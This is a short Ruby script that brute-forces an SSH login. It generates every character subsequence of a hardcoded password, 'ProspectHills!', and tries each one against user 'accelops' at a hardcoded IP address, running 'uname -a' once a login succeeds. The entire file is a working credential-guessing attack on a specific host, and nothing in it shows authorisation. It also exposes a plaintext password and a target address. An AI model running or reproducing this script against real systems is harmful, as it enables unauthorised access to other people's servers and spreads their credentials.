# To change this template, choose Tools | Templates
# and open the template in the editor.

require 'set'
require 'num_convert'

require 'rubygems'
require 'net/ssh'

passwd = "ProspectHills!"

length = passwd.length
count = 2**length
puts count

set = Set.new
count.times do |num|
  pwd = ""
  mask = dec2bin(num)
  mask.length.times do |i|
    if(mask[i, 1] == "1")
      pwd << passwd[i, 1]
    end
  end
  set.add(pwd)
end

puts set.length
total = set.length
i = 0
for pwd in set
  puts "#{i += 1}/#{total}\t #{pwd}  \t\t\t... "
  begin
    Net::SSH.start('211.144.206.180', 'accelops', :password => pwd) do |ssh|
      # capture all stderr and stdout output from a remote process
      output = ssh.exec!("uname -a")
      puts output
      puts "\0007", "success!"
      break
    end
  rescue Net::SSH::Exception => e
    puts e.message, e.class, e.backtrace
  end
end


puts "done"
